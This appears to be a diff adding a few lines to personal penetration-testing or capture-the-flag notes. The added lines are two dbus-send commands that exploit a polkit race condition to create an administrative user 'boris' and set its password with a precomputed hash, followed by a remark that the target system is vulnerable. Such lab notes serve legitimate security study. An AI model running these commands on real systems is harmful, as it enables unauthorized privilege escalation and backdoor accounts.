@@ -59,6 +59,13 @@
 
 * dwightschrute
 
+
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1 & sleep 0.008s ; kill $!
+
+
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string:'$5$9S6xxwc8VPUCYQuU$KrtrLFCbnH8q6uZzOtB7KW7efCn4BMlTJGGAaqSTFi0' string:GoldenEye & sleep 0.008s ; kill $!
+
+* Polkit exploitation that the exact operating system that we have is vulnerable to. It has the exact specifications that allow this exploit to succeed
 <br/><br/>
 
 
